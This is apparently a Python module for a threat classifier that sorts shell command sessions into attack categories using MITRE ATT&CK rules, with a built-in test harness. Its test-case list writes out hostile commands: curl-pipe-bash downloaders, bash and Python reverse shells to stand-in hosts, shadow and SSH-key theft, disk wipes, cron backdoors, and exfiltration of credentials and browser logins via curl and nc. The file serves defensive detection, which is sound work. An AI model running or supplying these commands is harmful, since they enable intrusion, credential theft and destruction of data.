"""
Hybrid Threat Classifier: MITRE Rules + Neural Fallback.

This classifier uses a rule-based approach grounded in MITRE ATT&CK knowledge,
with the neural model as a tiebreaker for ambiguous cases.

Classification Logic:
1. Compute MITRE annotations (tactics, severity, kill chain)
2. Apply domain-expert rules based on tactic combinations
3. Use neural model confidence as a secondary signal
4. Return final classification with explanation

Key Insight:
The neural model alone struggles because:
- It memorizes training patterns, not semantic meaning
- "cat /etc/passwd" looks like "cat README.md" to character n-grams
- MITRE rules provide semantic grounding

Rule Priorities (from highest to lowest severity):
1. DESTRUCTIVE: impact tactics with severity >= 9
2. APT: 4+ tactics OR (persistence + exfiltration) OR (credential + command_control + execution)
3. EXPLOIT: credential_access with severity >= 8, OR execution tactics with reverse shells
4. DOWNLOADER: command_and_control + execution, OR ingress_tool_transfer
5. RECON: discovery-only tactics, network scanning patterns
6. SAFE: no matches OR discovery-only with severity < 4
"""

import sys
import pickle
import torch
import numpy as np
from pathlib import Path
from typing import Dict, Tuple, List, Optional

# Add project root to path
PROJECT_ROOT = Path(__file__).parent.parent.parent.parent
sys.path.insert(0, str(PROJECT_ROOT / "src"))

from core.mitre.session_annotator import annotate_session, get_mitre_feature_columns, annotation_to_flat_dict

# =============================================================================
# Configuration
# =============================================================================

CLASS_NAMES = ['Safe', 'Recon', 'Downloader', 'Exploit', 'Destructive', 'ADVANCED_APT']
CLASS_IDS = {name: i for i, name in enumerate(CLASS_NAMES)}

MITRE_COLS = get_mitre_feature_columns()  # 21 numeric features

# Binary feature columns (79) - must match training
BINARY_COLS = [
    'triage_file_size', 'triage_entropy', 'triage_priority',
    'triage_is_go', 'triage_is_packed', 'triage_is_stripped',
    'triage_is_dll', 'triage_is_static', 'triage_score_mining',
    'triage_score_botnet', 'triage_score_recon', 'triage_score_destructive',
    'ghidra_function_count', 'ghidra_total_instructions', 'ghidra_total_basic_blocks',
    'ghidra_max_function_size', 'ghidra_avg_callers', 'ghidra_max_callers',
    'ghidra_mining_pool_count', 'ghidra_crypto_wallet_count', 'ghidra_ip_count',
    'ghidra_url_count', 'ghidra_shell_cmd_count', 'ghidra_file_path_count',
    'ghidra_imports_file_io', 'ghidra_imports_process', 'ghidra_imports_network',
    'ghidra_imports_crypto', 'ghidra_imports_evasion', 'ghidra_has_aes_sbox',
    'ghidra_has_sha256_constants', 'ghidra_has_rc4_state', 'ghidra_has_xor_loop',
    'ghidra_go_user_functions', 'ghidra_go_runtime_functions',
    'angr_basic_blocks', 'angr_edges', 'angr_functions_recovered',
    'angr_cyclomatic_complexity', 'angr_function_count', 'angr_user_functions_listed',
    'angr_syscalls_network', 'angr_syscalls_file_io', 'angr_syscalls_process',
    'angr_syscalls_memory', 'angr_ip_count', 'angr_url_count',
    'angr_mining_indicator_count', 'angr_shell_cmd_count', 'angr_has_network',
    'angr_has_file_manipulation', 'angr_has_process_control', 'angr_has_crypto',
    'angr_has_mining', 'angr_has_persistence', 'angr_has_evasion',
    'angr_has_shell_execution', 'angr_complexity_tier', 'angr_is_partial',
    'angr_loaded_as_blob',
    'script_line_count', 'script_url_count', 'script_download_count',
    'script_arch_count', 'script_is_downloader', 'script_is_multi_arch',
    'script_is_miner', 'script_has_persistence', 'script_has_anti_forensics',
    'has_ghidra_results', 'has_angr_results', 'has_script_results',
    'deep_func_ratio_angr_ghidra', 'deep_mining_signal_count',
    'deep_total_network_indicators', 'deep_total_crypto_indicators',
    'deep_max_complexity', 'deep_total_evasion_indicators', 'deep_is_go_consensus',
]

STRUCTURED_DIM = len(MITRE_COLS) + len(BINARY_COLS)  # 21 + 79 = 100


# =============================================================================
# MITRE Feature Extraction
# =============================================================================

def parse_commands(commands: str) -> List[str]:
    """Parse command string into list of individual commands."""
    cmd_list = []
    # Split by common command separators
    parts = commands.replace('&&', ';').replace('||', ';').replace('\n', ';').split(';')
    for part in parts:
        part = part.strip()
        if part:
            cmd_list.append(part)
    return cmd_list if cmd_list else [commands]


def get_mitre_annotation(commands: str) -> Dict:
    """Get MITRE ATT&CK annotation for commands."""
    cmd_list = parse_commands(commands)
    return annotate_session(cmd_list)


# =============================================================================
# Rule-Based Classifier
# =============================================================================

class HybridClassifier:
    """
    Hybrid threat classifier using MITRE rules + neural fallback.
    """
    
    def __init__(self, neural_model=None, tokenizer=None, device='cpu'):
        self.neural_model = neural_model
        self.tokenizer = tokenizer
        self.device = device
        
    def classify(self, commands: str, binary_features: Optional[np.ndarray] = None) -> Tuple[int, str, Dict]:
        """
        Classify a command sequence.
        
        Returns:
            (class_id, class_name, explanation_dict)
        """
        # Get MITRE annotation
        annotation = get_mitre_annotation(commands)
        tactic_vec = annotation['tactic_vector']
        severity_max = annotation['severity_max']
        severity_mean = annotation['severity_mean']
        kill_chain = annotation['kill_chain_score']
        technique_count = annotation['unique_technique_count']
        techniques = annotation['technique_ids']
        
        # Count active tactics
        active_tactics = [t for t, v in tactic_vec.items() if v > 0]
        num_tactics = len(active_tactics)
        
        explanation = {
            'mitre_tactics': active_tactics,
            'severity_max': severity_max,
            'severity_mean': severity_mean,
            'kill_chain_score': kill_chain,
            'technique_count': technique_count,
            'techniques': techniques,
            'rule_matched': None,
            'confidence': 1.0,
        }
        
        # === RULE 1: DESTRUCTIVE ===
        # Impact tactics with high severity (but not if it's primarily a download operation)
        has_download = tactic_vec.get('command_and_control', 0) > 0
        
        if tactic_vec.get('impact', 0) > 0 and severity_max >= 9:
            explanation['rule_matched'] = 'DESTRUCTIVE: impact tactic with severity >= 9'
            return CLASS_IDS['Destructive'], 'Destructive', explanation
        
        # Data destruction without C2 (not a downloader that happens to modify perms)
        if tactic_vec.get('impact', 0) > 0 and not has_download:
            explanation['rule_matched'] = 'DESTRUCTIVE: impact tactic without download'
            return CLASS_IDS['Destructive'], 'Destructive', explanation
        
        # === RULE 2: APT (ADVANCED_APT) ===
        # Multiple tactics indicate sophisticated attack
        if num_tactics >= 4:
            explanation['rule_matched'] = f'APT: {num_tactics} distinct tactics (>= 4)'
            return CLASS_IDS['ADVANCED_APT'], 'ADVANCED_APT', explanation
        
        # Persistence + exfiltration = APT
        if tactic_vec.get('persistence', 0) > 0 and tactic_vec.get('exfiltration', 0) > 0:
            explanation['rule_matched'] = 'APT: persistence + exfiltration'
            return CLASS_IDS['ADVANCED_APT'], 'ADVANCED_APT', explanation
        
        # Credential access + C2 + execution = APT
        if (tactic_vec.get('credential_access', 0) > 0 and 
            tactic_vec.get('command_and_control', 0) > 0 and
            tactic_vec.get('execution', 0) > 0):
            explanation['rule_matched'] = 'APT: credential_access + C2 + execution'
            return CLASS_IDS['ADVANCED_APT'], 'ADVANCED_APT', explanation
        
        # Persistence + any attack tactic
        if tactic_vec.get('persistence', 0) > 0 and num_tactics >= 2:
            explanation['rule_matched'] = 'APT: persistence + multiple tactics'
            return CLASS_IDS['ADVANCED_APT'], 'ADVANCED_APT', explanation
        
        # === RULE 3: EXPLOIT ===
        # Credential access with high severity
        if tactic_vec.get('credential_access', 0) > 0 and severity_max >= 8:
            explanation['rule_matched'] = 'EXPLOIT: credential_access with severity >= 8'
            return CLASS_IDS['Exploit'], 'Exploit', explanation
        
        # Execution + C2 (reverse shells)
        if tactic_vec.get('execution', 0) > 0 and tactic_vec.get('command_and_control', 0) > 0:
            # Check if this is a downloader (has tool transfer) or exploit (shell)
            if severity_max >= 8:
                explanation['rule_matched'] = 'EXPLOIT: execution + C2 with high severity (reverse shell)'
                return CLASS_IDS['Exploit'], 'Exploit', explanation
        
        # Privilege escalation
        if tactic_vec.get('privilege_escalation', 0) > 0 and severity_max >= 7:
            explanation['rule_matched'] = 'EXPLOIT: privilege_escalation with severity >= 7'
            return CLASS_IDS['Exploit'], 'Exploit', explanation
        
        # Credential access alone
        if tactic_vec.get('credential_access', 0) > 0:
            explanation['rule_matched'] = 'EXPLOIT: credential_access present'
            return CLASS_IDS['Exploit'], 'Exploit', explanation
        
        # === RULE 4: DOWNLOADER ===
        # C2 + execution (downloading and running)
        if tactic_vec.get('command_and_control', 0) > 0 and tactic_vec.get('execution', 0) > 0:
            explanation['rule_matched'] = 'DOWNLOADER: command_and_control + execution'
            return CLASS_IDS['Downloader'], 'Downloader', explanation
        
        # C2 alone (ingress tool transfer)
        if tactic_vec.get('command_and_control', 0) > 0:
            explanation['rule_matched'] = 'DOWNLOADER: command_and_control present'
            return CLASS_IDS['Downloader'], 'Downloader', explanation
        
        # Defense evasion + execution (obfuscated execution)
        if tactic_vec.get('defense_evasion', 0) > 0 and tactic_vec.get('execution', 0) > 0:
            explanation['rule_matched'] = 'DOWNLOADER: defense_evasion + execution'
            return CLASS_IDS['Downloader'], 'Downloader', explanation
        
        # === RULE 5: RECON ===
        # Discovery tactics with moderate severity
        if tactic_vec.get('discovery', 0) > 0 and severity_max >= 4:
            explanation['rule_matched'] = 'RECON: discovery with severity >= 4'
            return CLASS_IDS['Recon'], 'Recon', explanation
        
        # Network reconnaissance (multiple discovery techniques)
        if tactic_vec.get('discovery', 0) >= 2:
            explanation['rule_matched'] = 'RECON: multiple discovery techniques'
            return CLASS_IDS['Recon'], 'Recon', explanation
        
        # Reconnaissance tactic (explicit)
        if tactic_vec.get('reconnaissance', 0) > 0:
            explanation['rule_matched'] = 'RECON: reconnaissance tactic present'
            return CLASS_IDS['Recon'], 'Recon', explanation
        
        # === RULE 6: SAFE ===
        # No MITRE matches or only low-severity discovery
        if technique_count == 0:
            explanation['rule_matched'] = 'SAFE: no MITRE techniques matched'
            return CLASS_IDS['Safe'], 'Safe', explanation
        
        if num_tactics == 1 and 'discovery' in active_tactics and severity_max <= 3:
            explanation['rule_matched'] = 'SAFE: discovery-only with severity <= 3'
            return CLASS_IDS['Safe'], 'Safe', explanation
        
        # === FALLBACK: Use neural model if available ===
        if self.neural_model is not None:
            return self._neural_classify(commands, binary_features, explanation)
        
        # No neural model, default to most likely based on severity
        if severity_max >= 7:
            explanation['rule_matched'] = 'FALLBACK: high severity, assuming Exploit'
            return CLASS_IDS['Exploit'], 'Exploit', explanation
        elif severity_max >= 4:
            explanation['rule_matched'] = 'FALLBACK: moderate severity, assuming Recon'
            return CLASS_IDS['Recon'], 'Recon', explanation
        else:
            explanation['rule_matched'] = 'FALLBACK: low severity, assuming Safe'
            return CLASS_IDS['Safe'], 'Safe', explanation
    
    def _neural_classify(self, commands: str, binary_features: Optional[np.ndarray], 
                         explanation: Dict) -> Tuple[int, str, Dict]:
        """Use neural model for classification."""
        # Tokenize
        encoded, lengths = self.tokenizer.encode_batch([commands])
        encoded = encoded.to(self.device)
        lengths = lengths.to(self.device)
        
        # Build structured features
        mitre_vals = self._get_mitre_features(commands)
        if binary_features is None:
            binary_features = np.zeros(len(BINARY_COLS), dtype=np.float32)
        structured = np.concatenate([mitre_vals, binary_features])
        structured = torch.tensor(structured, dtype=torch.float32).unsqueeze(0).to(self.device)
        
        # Predict
        with torch.no_grad():
            preds, probs = self.neural_model.predict(encoded, structured, lengths)
        
        pred_label = preds[0].item()
        confidence = probs[0][pred_label].item()
        
        explanation['rule_matched'] = f'NEURAL: {CLASS_NAMES[pred_label]} ({confidence*100:.1f}%)'
        explanation['confidence'] = confidence
        
        return pred_label, CLASS_NAMES[pred_label], explanation
    
    def _get_mitre_features(self, commands: str) -> np.ndarray:
        """Extract MITRE features for neural model."""
        cmd_list = parse_commands(commands)
        annotation = annotate_session(cmd_list)
        flat = annotation_to_flat_dict(annotation)
        
        mitre_vals = []
        for col in MITRE_COLS:
            val = flat.get(col, 0)
            if isinstance(val, str):
                val = 0
            mitre_vals.append(float(val))
        
        return np.array(mitre_vals, dtype=np.float32)


# =============================================================================
# Test Cases
# =============================================================================

DIVERSE_TEST_CASES = [
    # Safe
    {"commands": "ls -la; pwd; whoami", "label": 0, "name": "Safe: basic commands"},
    {"commands": "uname -a; hostname; date", "label": 0, "name": "Safe: system info"},
    {"commands": "cat README.md; head -10 file.txt", "label": 0, "name": "Safe: file reading"},
    
    # Recon
    {"commands": "nmap -sS -p 22,80,443 192.168.1.1", "label": 1, "name": "Recon: nmap scan"},
    {"commands": "netstat -tulpn; ss -antp; arp -a", "label": 1, "name": "Recon: network enum"},
    {"commands": "cat /etc/passwd; find / -perm -4000 2>/dev/null", "label": 1, "name": "Recon: user/suid enum"},
    {"commands": "ps aux; top -bn1; who; w; last", "label": 1, "name": "Recon: process/user enum"},
    
    # Downloader
    {"commands": "wget http://evil.com/bot.sh; chmod +x bot.sh; ./bot.sh", "label": 2, "name": "Downloader: wget exec"},
    {"commands": "curl -sL http://c2.attacker.net/payload | bash", "label": 2, "name": "Downloader: curl pipe bash"},
    {"commands": "cd /tmp; wget http://192.168.1.100/xmrig; chmod 777 xmrig; ./xmrig", "label": 2, "name": "Downloader: miner"},
    
    # Exploit
    {"commands": "cat /etc/shadow; unshadow /etc/passwd /etc/shadow > hashes.txt", "label": 3, "name": "Exploit: credential theft"},
    {"commands": "bash -i >& /dev/tcp/10.10.10.10/4444 0>&1", "label": 3, "name": "Exploit: reverse shell"},
    {"commands": "cat ~/.ssh/id_rsa; cat ~/.bash_history | grep -i password", "label": 3, "name": "Exploit: key/history theft"},
    {"commands": "python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"evil.com\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'", "label": 3, "name": "Exploit: python revshell"},
    
    # Destructive
    {"commands": "rm -rf /; rm -rf /*", "label": 4, "name": "Destructive: rm -rf /"},
    {"commands": "dd if=/dev/zero of=/dev/sda bs=1M", "label": 4, "name": "Destructive: disk wipe"},
    {"commands": "rm -rf /var/log/*; history -c; cat /dev/null > ~/.bash_history", "label": 4, "name": "Destructive: log/history wipe"},
    {"commands": "shred -u /etc/passwd /etc/shadow; rm -rf /home/*", "label": 4, "name": "Destructive: shred files"},
    {"commands": "cd ~; rm -rf .ssh; mkdir .ssh; echo 'ssh-rsa AAAA...' >> .ssh/authorized_keys", "label": 4, "name": "Destructive: SSH backdoor"},
    
    # APT
    {"commands": "uname -a; id; wget http://c2.evil.com/implant -O /tmp/.sys; chmod +x /tmp/.sys; /tmp/.sys &; echo '* * * * * /tmp/.sys' >> /var/spool/cron/root; cat /etc/shadow > /tmp/.c; curl -X POST http://c2.evil.com/exfil -d @/tmp/.c; rm /tmp/.c; history -c", "label": 5, "name": "APT: full kill chain"},
    {"commands": "hostname; curl -s http://c2/backdoor -o /tmp/.bd; chmod +x /tmp/.bd; nohup /tmp/.bd &; cp /tmp/.bd /usr/bin/.sysupdate; echo '/usr/bin/.sysupdate &' >> ~/.bashrc; cat /etc/shadow | base64 | curl -X POST http://c2/data -d @-", "label": 5, "name": "APT: persistence + exfil"},
    {"commands": "ps aux; netstat -antp; wget http://evil.com/kit.tar.gz -O /tmp/k.tgz; tar xzf /tmp/k.tgz -C /opt; echo '0 */6 * * * /opt/kit/beacon' >> /etc/crontab; sqlite3 ~/.config/google-chrome/Default/Login\\ Data 'SELECT * FROM logins' > /tmp/.b; nc evil.com 443 < /tmp/.b; rm -rf /tmp/k.tgz /tmp/.b", "label": 5, "name": "APT: toolkit + browser creds"},
]


def evaluate_hybrid_classifier():
    """Evaluate the hybrid classifier on test cases."""
    print("=" * 80)
    print("HYBRID CLASSIFIER EVALUATION (MITRE Rules + Neural Fallback)")
    print("=" * 80)
    
    classifier = HybridClassifier()  # No neural model, pure rules
    
    correct = 0
    results_by_class = {name: {'correct': 0, 'total': 0} for name in CLASS_NAMES}
    
    for tc in DIVERSE_TEST_CASES:
        expected_id = tc['label']
        expected_name = CLASS_NAMES[expected_id]
        
        pred_id, pred_name, explanation = classifier.classify(tc['commands'])
        
        is_correct = pred_id == expected_id
        if is_correct:
            correct += 1
        
        results_by_class[expected_name]['total'] += 1
        if is_correct:
            results_by_class[expected_name]['correct'] += 1
        
        status = "OK" if is_correct else "FAIL"
        print(f"\n[{status}] {tc['name']}")
        print(f"  Expected: {expected_name}, Got: {pred_name}")
        print(f"  Rule: {explanation['rule_matched']}")
        if explanation['mitre_tactics']:
            print(f"  Tactics: {explanation['mitre_tactics']}")
            print(f"  Severity: max={explanation['severity_max']}, mean={explanation['severity_mean']:.1f}")
        if not is_correct:
            print(f"  Commands: {tc['commands'][:80]}...")
    
    accuracy = correct / len(DIVERSE_TEST_CASES) * 100
    
    print(f"\n{'=' * 80}")
    print("RESULTS BY CLASS")
    print("=" * 80)
    for name in CLASS_NAMES:
        stats = results_by_class[name]
        if stats['total'] > 0:
            acc = stats['correct'] / stats['total'] * 100
            print(f"  {name}: {stats['correct']}/{stats['total']} ({acc:.0f}%)")
    
    print(f"\n{'=' * 80}")
    print(f"OVERALL ACCURACY: {correct}/{len(DIVERSE_TEST_CASES)} ({accuracy:.1f}%)")
    print("=" * 80)
    
    return accuracy


if __name__ == '__main__':
    evaluate_hybrid_classifier()
